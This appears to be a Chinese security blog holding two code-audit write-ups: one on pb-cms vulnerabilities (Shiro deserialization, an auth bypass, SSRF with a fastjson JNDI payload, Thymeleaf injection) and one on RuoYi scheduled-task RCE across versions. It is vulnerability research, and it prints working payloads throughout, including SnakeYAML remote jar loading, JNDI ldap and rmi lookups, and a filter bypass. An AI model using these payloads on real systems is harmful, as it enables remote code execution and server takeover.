<h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>项目地址：<a class="link"   href="https://gitee.com/LinZhaoguan/pb-cms/tree/v1.0.0/" >https://gitee.com/LinZhaoguan/pb-cms/tree/v1.0.0/<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="0x03-声明"><a href="#0x03-声明" class="headerlink" title="0x03 声明"></a>0x03 声明</h2><p>此分享主要用于交流学习，请勿用于非法用途，否则一切后果自付。</p>
<h2 id="0x04-shiro反序列化漏洞"><a href="#0x04-shiro反序列化漏洞" class="headerlink" title="0x04 shiro反序列化漏洞"></a>0x04 shiro反序列化漏洞</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在pom.xml文件中可以看到shiro的版本是<code>1.4.1</code>是存在反序列化漏洞的</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d64825d2a62.png"  alt="image-20240222025948750"></p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>拿出我们的shiro一把梭工具，工具下载地址：<a class="link"   href="https://github.com/j1anFen/shiro_attack" >https://github.com/j1anFen/shiro_attack<i class="fas fa-external-link-alt"></i></a></p>
<p>爆秘钥以及利用链</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d648a9aed3a.png"  alt="image-20240222030201116"></p>
<p>执行命令</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d648bec8b9c.png"  alt="image-20240222030222079"></p>
<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>最开始看到shiro的版本是1.4.1最先想到的就是shiro720，因为shiro550的利用版本要 &lt; 1.2.4。</p>
<p>但是在在Shiro反序列化漏洞修复的过程中，如果仅进行Shiro的版本升级，而没有重新生成密钥，那么AES加密的默认密钥扔硬编码在代码里，仍然会存在反序列化风险。</p>
<p>所以猜测该cms对cookie加密仍然使用的是<code>硬编码</code></p>
<p>在看了shiro的配置文件之后，发现确实如此！</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d64cff1f60e.png"  alt="image-20240222032030472"></p>
<h2 id="0x05-shiro权限绕过"><a href="#0x05-shiro权限绕过" class="headerlink" title="0x05 shiro权限绕过"></a>0x05 shiro权限绕过</h2><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>既然shiro的版本是<code>1.4.1</code>，那肯定也存在权限绕过漏洞。</p>
<p>例如：CVE-2020-11989</p>
<p>Apache Shiro 1.5.3之前的版本中，当将Apache Shiro与Spring动态控制器一起使用时，精心编制的请求可能会导致绕过身份验证。</p>
<p>漏洞的主要原因就是shiro和spring对路径的解析有差异！</p>
<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>直接访问<code>/cms/admin</code>，会跳转让我们先登录</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d651b29f19a.png"  alt="image-20240222034033903"></p>
<p>使用<code>/;/cms/admin</code>绕过</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d651eeba3e3.png"  alt="image-20240222034133724"></p>
<h3 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h3><p><strong>1）shiro</strong></p>
<p>把断点下在<code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain()</code></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d65722ec3c8.png"  alt="image-20240222040346140"></p>
<p>通过<code>this.getPathWithinApplication(request)</code>来获取uri。</p>
<p>一直alt+shift+f7，我们可以跟进到<code>org.apache.shiro.web.util.WebUtils#getPathWithinApplication</code></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d658011181c.png"  alt="image-20240222040728346"></p>
<p>具体获取uri的逻辑就在<code>getRequestUri(request)</code>中，跟进之后会发现，在返回uri前通过<code>decodeAndCleanUriString</code>方法做了一些处理</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d6585f954af.png"  alt="image-20240222040902722"></p>
<p>这段代码的作用是对 URI 进行处理，截取第一个分号之前的部分并返回</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d658b3a68c0.png"  alt="image-20240222041026919"></p>
<p>所以最终我们获取到的就是<code>/</code></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d6590e5af1e.png"  alt="image-20240222041157686"></p>
<p>最终和shiro过滤器中的<code>&quot;/&quot;, &quot;anon&quot;</code>匹配</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d65ab97fc9a.png"  alt="image-20240222041904806"></p>
<p><strong>2）spring</strong></p>
<p>断点下载<code>org.springframework.web.util.UrlPathHelper#getPathWithinServletMapping</code></p>
<p>通过<code>getPathWithinApplication</code>来获取uri</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d65cc602b87.png"  alt="image-20240222042749239"></p>
<p>跟进之后跟shiro的分析过程类似，跟进之后可以看到<code>this.getRequestUri(request)</code>中实现了获取uri的具体逻辑</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d65dfded31c.png"  alt="image-20240222043301257"></p>
<p>继续跟进，可以看到返回前使用<code>decodeAndCleanUriString</code>方法做了处理</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d65e732b6a6.png"  alt="image-20240222043458879"></p>
<p>跟进，第一步过滤了<code>;</code>，第二部过滤了重复的<code>/</code>，最终得到<code>/cms/admin/</code></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d65e956f384.png"  alt="image-20240222043533131"></p>
<p><strong>3）总结</strong></p>
<p>shiro对<code>/;/cms/admin/</code>处理后得到<code>/</code>绕过了权限认证</p>
<p>spring对<code>/;/cms/admin/</code>处理后得到<code>/cms/admin/</code>正常访问</p>
<h2 id="0x06-Ssrf结合Fastjson"><a href="#0x06-Ssrf结合Fastjson" class="headerlink" title="0x06 Ssrf结合Fastjson"></a>0x06 Ssrf结合Fastjson</h2><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>作者可能是不小心多打了一个点，导致管理员少了一个权限。</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d660811fbe4.png"  alt="image-20240222044344758"></p>
<p>到数据库中把这个点删了，然后重启，重新登录。之后再看<code>文章列表</code>就会发现多了一个批量推送的功能！</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d667f7b8aef.png"  alt="image-20240222051535308"></p>
<p>这个漏洞是通过自动化工具扫出来的，不然还真发现不了。</p>
<p>就是Ssrf，但只支持http协议，并且无回显</p>
<p>不过后貌似可以结合fastjson打一下。</p>
<p>fastjson版本是1.2.66，并且存在shiro-core依赖，所以有机会利用一下</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d67ed0eb357.png"  alt="image-20240222065303889"></p>
<h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><strong>1）ssrf</strong></p>
<p>首先使用yakit的dnslog生成一个域名</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d669253c399.png"  alt="image-20240222052036906"></p>
<p>到网站管理 -&gt; 基础信息出，替换百度推送地址</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d6694035ff8.png"  alt="image-20240222052103830"></p>
<p>然后到文章列表处点批量推送</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d669a650510.png"  alt="image-20240222052245922"></p>
<p>成功触发</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d6698e7fddc.png"  alt="image-20240222052222177"></p>
<p><strong>2）fastjson</strong></p>
<p>怎么说呢，它这环境中fastjson是利用不了的。因为在fastjson1.2.66环境下，autotypesupport属性为true才可使用，但在1.2.25版本以后该属性默认为false</p>
<p>为了掩饰一下组合漏洞的效果，咱把<code>autotypesupport</code>设置为true</p>
<p>把<code>com.puboot.module.admin.controller.ArticleController#pushBatch</code>修改一下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">baiduPushResVo</span> <span class="operator">=</span> JSON.parseObject(PushArticleUtil.postBaidu(url, urls));</span><br><span class="line"><span class="keyword">if</span> (<span class="number">1</span>==<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d68471e5e72.png"  alt="image-20240222071705059"></p>
<p>还有一个地方要改一下，不然会报错！</p>
<p>在<code>com.puboot.common.util.PushArticleUtil#postBaidu</code>。这中间一些写入的代码删掉，感觉是作者设计的问题！</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d680da43c11.png"  alt="image-20240222070145506"></p>
<p>业务逻辑应该是要<em>允许写入输出</em>，但作者并没有设置。所以会报错</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d681a832c6e.png"  alt="image-20240222070511289"></p>
<p>先删掉好了</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d680a56fd0c.png"  alt="image-20240222070052615"></p>
<p>现在环境就OK了，我们使用yakit起一个<code>ldap</code>服务</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d681e5cf1e8.png"  alt="image-20240222070612957"></p>
<p>接着vps起一个web服务返回payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;, &quot;jndiNames&quot;:[&quot;ldap://127.0.0.1:8085/uRKFmZXL&quot;], &quot;Realms&quot;:[&quot;&quot;]&#125;</span><br></pre></td></tr></table></figure>

<p>可以用python，我是直接用的宝塔</p>
<p>接着就百度推送地址改成我们vps地址就ok</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d682900423f.png"  alt="image-20240222070903150"></p>
<p>点击推送，弹出计算机</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d684af309fd.png"  alt="image-20240222071806121"></p>
<p>总的来说呢，fastjson是利用不了的。但觉得ssrf+fastjson挺有意思就改了一下</p>
<h3 id="代码审计-2"><a href="#代码审计-2" class="headerlink" title="代码审计"></a>代码审计</h3><p>在<code>com.puboot.module.admin.controller.ArticleController#pushBatch</code>，下突出下个断点，点击推送</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d6850b359c8.png"  alt="image-20240222071938383"></p>
<p>可以看到先和我们之前设置的百度推送地址建立连接</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d6857b4561d.png"  alt="image-20240222072130313"></p>
<p>中间有一块应该是推送的代码，就之前删除那部分（说实话没太理解），然后就是获取响应的内容返回</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d685d561dfb.png"  alt="image-20240222072300455"></p>
<p>之后就触发fastjson漏洞</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d6864e2742b.png"  alt="image-20240222072501342"></p>
<h2 id="0x07-Thymeleaf模板注入漏洞"><a href="#0x07-Thymeleaf模板注入漏洞" class="headerlink" title="0x07 Thymeleaf模板注入漏洞"></a>0x07 Thymeleaf模板注入漏洞</h2><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>能引起Thymeleaf模板注入漏洞的就两种情况：</p>
<p>1）在查找模板中，引用了用户输入的内容</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/path&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">path</span><span class="params">(<span class="meta">@RequestParam</span> String lang)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span>  lang ; <span class="comment">//template path is tainted</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2）controller无返回值，则以GetMapping的路由为视图名称</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/doc/&#123;document&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getDocument</span><span class="params">(<span class="meta">@PathVariable</span> String document)</span> &#123;</span><br><span class="line">    log.info(<span class="string">&quot;Retrieving &quot;</span> + document);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以我们在寻找Thymeleaf模板注入漏洞时，重点关注一下以上两种情况，看看有没有查找模版时<code>视图名称</code>用户可控</p>
<h3 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>在主题管理功能处新增主题，然后在主题名称填入我们的payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__$&#123;T(Runtime).getRuntime().exec(&quot;calc&quot;)&#125;__::.x</span><br></pre></td></tr></table></figure>

<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d768450f83d.png"  alt="image-20240222232907295"></p>
<p>之后我们点启用</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d7687f8e72f.png"  alt="image-20240222233006215"></p>
<p>访问网站首页即可触发：<a class="link"   href="http://localhost:8080/cms/" >http://localhost:8080/cms/<i class="fas fa-external-link-alt"></i></a></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d76d48dcdb5.gif" ></p>
<h3 id="代码审计-3"><a href="#代码审计-3" class="headerlink" title="代码审计"></a>代码审计</h3><p>可以看到，在访问网站首页时，通过<code>bizThemeService.selectCurrent().getName()</code>可以获取到我们之前设置的主题的名称</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d76ec875d5b.png"  alt="image-20240222235655047"></p>
<h2 id="0x08-后话"><a href="#0x08-后话" class="headerlink" title="0x08 后话"></a>0x08 后话</h2><p>这块其实还有一个文件上传的漏洞，详情可以看看这位师傅提的：<a class="link"   href="https://gitee.com/LinZhaoguan/pb-cms/issues/I8T4WR" >https://gitee.com/LinZhaoguan/pb-cms/issues/I8T4WR<i class="fas fa-external-link-alt"></i></a></p>
<p>它未过滤后缀并且可以目录遍历，本来是想着覆盖计划任务反弹shell，但是深入后发现，作者在对上传文件进行了一些处理，结合时间戳重新对文件进行了命名。</p>
<p>逻辑就是以最后一个点为分割，在中间拼接当前时间戳！若上传文件<code>as.exe</code>，处理后就是<code>as_1708639915916.exe</code></p>
<p>在覆盖计划任务，抓包后修改文件名为<code>../../var/spool/cron/root</code>，最终得路径就是<code>\自己设置的存图片路径\20240223\../._1708639915916../../var/spool/cron/root</code></p>
<p>这就导致不能覆盖计划任务了，如何有师傅有绕过思路，一块交流交流！</p>
]]></content>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>若依定时任务分析</title>
    <url>/blog/2024/03/17/240317%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p><strong>文章首发于奇安信攻防社区</strong></p>
<p><strong>链接：</strong><a class="link"   href="https://forum.butian.net/share/2796" >https://forum.butian.net/share/2796<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关于若依漏洞或者是审计的文章网上挺多的，本来就只是想写一下最新版4.7.8的RCE。因为之前没接触过若依就打算看看定时任务实现的原理以及历史的漏洞，但是在查阅资料的时候，发现了<strong>一些</strong>文章给的poc有问题，比如作者写的是&lt;4.7.2时，给的是<code>org.springframework.jndi.JndiLocatorDelegate.lookup(&#39;r&#39;m&#39;i://ip:端口/refObj&#39;)</code>，大概作者的目的是想说明可以通过若依对字符串的处理的一些问题(参数中的<code>&#39;</code>会替换为空)绕过对<code>rmi</code>的过滤，但是却没有考虑到<code>org.springframework.jndi</code>在4.7.1版本中已经加入了黑名单。作者也只是给出了poc，并没有复现的过程！</p>
<h2 id="计划任务实现原理"><a href="#计划任务实现原理" class="headerlink" title="计划任务实现原理"></a>计划任务实现原理</h2><p>从<a class="link"   href="https://doc.ruoyi.vip/ruoyi/document/htsc.html#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1" >官方文档<i class="fas fa-external-link-alt"></i></a>可以看出可以通过两种方法调用目标类：</p>
<ul>
<li>Bean调用示例：ryTask.ryParams(‘ry’) </li>
<li>Class类调用示例：com.ruoyi.quartz.task.RyTask.ryParams(‘ry’)</li>
</ul>
<p>接下来咱调试一下，看看具体是如何实现的这个功能的</p>
<p>首先直接在测试类下个断点，看看调用</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/05/65e708f929690.png"  alt="image-20240305195847965"></p>
<p>通过系统默认的任务1来执行这个测试类</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/05/65e709c3aa9c9.png"  alt="image-20240305200210899"></p>
<p><img   src="http://124.71.147.32/uploads/2024/03/05/65e709b09fcbe.png"  alt="image-20240305200151822"></p>
<p>在调用过程中，会发现在<code>com.ruoyi.quartz.util.JobInvokeUtil</code>类中存在两个名为<code>invokeMethod</code>的方法，并前后各调用了一次</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/05/65e70e9d720fc.png"  alt="image-20240305202252424"></p>
<p>在第一个<code>invokeMethod</code>方法中对调用目标字符串的类型进行判断，判断是Bean还是Class。</p>
<ul>
<li>bean就通过getBean()直接获取bean的实例</li>
<li>类名就通过反射获取类的实例</li>
</ul>
<p>然后调用第二个<code>invokeMethod</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!isValidClassName(beanName))&#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> SpringUtils.getBean(beanName);</span><br><span class="line">    invokeMethod(bean, methodName, methodParams);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> Class.forName(beanName).newInstance();</span><br><span class="line">    invokeMethod(bean, methodName, methodParams);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第二个<code>invokeMethod</code>这个方法通过反射来加载测试类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (StringUtils.isNotNull(methodParams) &amp;&amp; methodParams.size() &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> bean.getClass().getDeclaredMethod(methodName, getMethodParamsType(methodParams));</span><br><span class="line">    method.invoke(bean, getMethodParamsValue(methodParams));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这大概就是定时任务加载类的逻辑</p>
<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>接着我们新增一个定时任务，看看在创建的过程中对调用目标字符串做了哪些处理</p>
<p>抓包可以看到直接调用了<code>/monitor/job/add</code>这个接口</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/05/65e7112778db0.png"  alt="image-20240305203342583"></p>
<p>可以看到就只是判断了一下，目标字符串是否包含<code>rmi://</code>，这就导致导致攻击者可以调用任意类、方法及参数触发反射执行命令。</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/05/65e71221e8b7d.png"  alt="image-20240305203753016"></p>
<p><img   src="http://124.71.147.32/uploads/2024/03/05/65e712556acdd.png"  alt="image-20240305203844623"></p>
<p>由于反射时所需要的：类、方法、参数都是我们可控的，所以我们只需传入一个能够执行命令的类方法就能达到getshell的目的，该类只需要满足如下几点要求即可：</p>
<ul>
<li>具有public类型的无参构造方法</li>
<li>自身具有public类型且可以执行命令的方法</li>
</ul>
<h2 id="4-6-2"><a href="#4-6-2" class="headerlink" title="4.6.2"></a>4.6.2</h2><p>因为目前对<strong>调用目标字符串</strong>限制不多，so直接拿网上公开的poc打吧！</p>
<ul>
<li>使用Yaml.load()来打SnakeYAML反序列化</li>
<li>JNDI注入</li>
</ul>
<h3 id="SnakeYAML反序列化"><a href="#SnakeYAML反序列化" class="headerlink" title="SnakeYAML反序列化"></a>SnakeYAML反序列化</h3><p>探测SnakeYAMLpoc：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String poc = &quot;&#123;!!java.net.URL [\&quot;http://5dsff0.dnslog.cn/\&quot;]: 1&#125;&quot;;</span><br></pre></td></tr></table></figure>

<p>利用SPI机制-基于ScriptEngineManager利用链来执行命令，直接使用这个师傅写好的脚本：<a class="link"   href="https://github.com/artsploit/yaml-payload" >https://github.com/artsploit/yaml-payload<i class="fas fa-external-link-alt"></i></a></p>
<p>1）把这块修改成要执行的命令</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/05/65e73554c177b.png"  alt="image-20240305230802764"></p>
<p>2）把项目生成jar包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java　　　　//编译java文件</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .　　　　　　　　　　　　　//打包成jar包</span><br></pre></td></tr></table></figure>

<p>3）在yaml-payload.jar根目录下起一个web服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m http.server 9999</span><br></pre></td></tr></table></figure>

<p>4）在计划任务添加payload，执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">org.yaml.snakeyaml.Yaml.load(&#x27;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://127.0.0.1:9999/yaml-payload.jar&quot;]]]]&#x27;)</span><br></pre></td></tr></table></figure>

<p><img   src="http://124.71.147.32/uploads/2024/03/05/65e7394e5398e.png"  alt="image-20240305232500918"></p>
<h3 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h3><p>使用yakit起一个返连服务</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/05/65e73eb20a544.png"  alt="image-20240305234800803"></p>
<p>poc：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javax.naming.InitialContext.lookup(&#x27;ldap://127.0.0.1:8085/calc&#x27;)</span><br></pre></td></tr></table></figure>

<p>nc监听端口</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/05/65e73e86ea61b.png"  alt="image-20240305234715061"></p>
<p><img   src="http://124.71.147.32/uploads/2024/03/05/65e73e9a8c282.png"  alt="image-20240305234736910"></p>
<h2 id="4-6-2-1"><a href="#4-6-2-1" class="headerlink" title="&lt; 4.6.2"></a>&lt; 4.6.2</h2><h3 id="rmi"><a href="#rmi" class="headerlink" title="rmi"></a>rmi</h3><p>上边的分析是拿4.6.2版本分析的，在创建定时任务时会判断目标字符串中有没有rmi关键字。后边有改回来看一下，发现在4.6.2版本以下，在创建定时任务时是没有任何过滤的。</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/06/65e845a7cd98b.png"  alt="image-20240306182957873"></p>
<p>所以在补充一个rmi的poc：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">org.springframework.jndi.JndiLocatorDelegate.lookup(&#x27;rmi://127.0.0.1:1099/refObj&#x27;)</span><br></pre></td></tr></table></figure>

<p><img   src="http://124.71.147.32/uploads/2024/03/06/65e84733450b7.png"  alt="image-20240306183633480"></p>
<p><img   src="http://124.71.147.32/uploads/2024/03/06/65e8474d500a9.png"  alt="image-20240306183659672"></p>
<h2 id=""><a href="#" class="headerlink" title="&lt;4.7.0"></a>&lt;4.7.0</h2><p><code>4.6.2~4.7.1</code>新增黑名单限制调用字符串</p>
<ul>
<li>定时任务屏蔽ldap远程调用</li>
<li>定时任务屏蔽http(s)远程调用</li>
<li>定时任务屏蔽rmi远程调用</li>
</ul>
<p><img   src="http://124.71.147.32/uploads/2024/03/06/65e84bf83f1be.png"  alt="image-20240306185654502"></p>
<p><img   src="http://124.71.147.32/uploads/2024/03/06/65e84c21c6567.png"  alt="image-20240306185736206"></p>
<p>来个小插曲，之前又看到一个文章，阅读量还不少类，师傅给出的poc是利用范围是**&lt;4.7.2**</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/06/65e84f09e5e85.png"  alt="image-20240306191000306"></p>
<p>后边发现不止这一篇，其他就不在举例了。</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/06/65e853e1e204b.png"  alt="image-20240306193040061"></p>
<p>但是我去翻了diff，发现在4.7.1中的黑名单已经过滤了这些poc。</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/06/65e84f5fd29a2.png"  alt="image-20240306191126087"></p>
<h3 id="单引号绕过"><a href="#单引号绕过" class="headerlink" title="单引号绕过"></a>单引号绕过</h3><p>在4.7.0的版本以下，仅仅只是屏蔽了ldap、http(s)、ldap。这里可以结合若依对将参数中的所有单引号替换为空来绕过</p>
<p>poc、例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">org.springframework.jndi.JndiLocatorDelegate.lookup(&#x27;r&#x27;m&#x27;i://127.0.0.1:1099/refObj&#x27;)</span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>创建任务时<code>r&#39;m&#39;i</code>可以绕过对<code>rmi</code>的过滤</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/06/65e88cb0a3739.png"  alt="image-20240306233303535"></p>
<p>之前分析的定时任务运行的原理，会在<code>com.ruoyi.quartz.util.JobInvokeUtil</code>类中第一个<code>invokeMethod</code>方法调用<code>getMethodParams</code>方法来获取参数</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/06/65e88d1b139f7.png"  alt="image-20240306233449771"></p>
<p>跟进之后发现会把参数中的<code>&#39;</code>替换为空</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/06/65e88d7600c13.png"  alt="image-20240306233620830"></p>
<p>打个断点调试一下</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/06/65e88de696756.png"  alt="image-20240306233813294"></p>
<h2 id="-1"><a href="#-1" class="headerlink" title="&lt;4.7.2"></a>&lt;4.7.2</h2><p>在这个版本下可以看到有可以看到有ldaps、配置文件rce等方法bypass，网上挺多文章的就不分析了</p>
<h3 id="ldaps"><a href="#ldaps" class="headerlink" title="ldaps"></a>ldaps</h3><h3 id="配置文件rce"><a href="#配置文件rce" class="headerlink" title="配置文件rce"></a>配置文件rce</h3><h2 id="4-7-3"><a href="#4-7-3" class="headerlink" title="4.7.3"></a>4.7.3</h2><p>在4.7.3的版本下，又增加了白名单，只能调用com.ruoyi包下的类！并且把之前所有的路堵死了</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/06/65e8708281228.png"  alt="image-20240306213248788"></p>
<p><img   src="http://124.71.147.32/uploads/2024/03/06/65e870af7f4e6.png"  alt="image-20240306213334189"></p>
<h2 id="4-7-8（最新版）"><a href="#4-7-8（最新版）" class="headerlink" title="4.7.8（最新版）"></a>4.7.8（最新版）</h2><p>依旧是没办法绕过黑白名单的限制。之前我们大概分析了一下定时任务的创建。对<strong>调用目标字符串</strong>过滤是在定时任务创建时进行的</p>
<p>审计之后可以看到，对目标字符串的过滤只发生在增加、修改计划任务时</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/06/65e872ce354d6.png"  alt="image-20240306214236876"></p>
<p>创建后的定时任务信息存储在<strong>sys_job</strong>表中</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/06/65e87232ae678.png"  alt="image-20240306214001345"></p>
<p>结合4.7.5 版本下的sql注入漏洞，直接修改表中的数据</p>
<p>参考：<a class="link"   href="https://gitee.com/y_project/RuoYi/issues/I65V2B" >https://gitee.com/y_project/RuoYi/issues/I65V2B<i class="fas fa-external-link-alt"></i></a></p>
<p>在<code>com.ruoyi.generator.controller.GenController#create</code></p>
<p><img   src="http://124.71.147.32/uploads/2024/03/06/65e87a082fc99.png"  alt="image-20240306221326697"></p>
<p>这块直接调用了<code>genTableService.createTable()</code>,咱直接跟进去看看</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/06/65e87a4b63f69.png"  alt="image-20240306221433954"></p>
<p>Mapper语句：</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/06/65e87a7029dab.png"  alt="image-20240306221510785"></p>
<p>接下来创建一个定时任务调用这个类，直接从sys_job表中把某一个定时任务调用目标字符串(invoke_target字段)改了</p>
<p>先谈个dnslog试试</p>
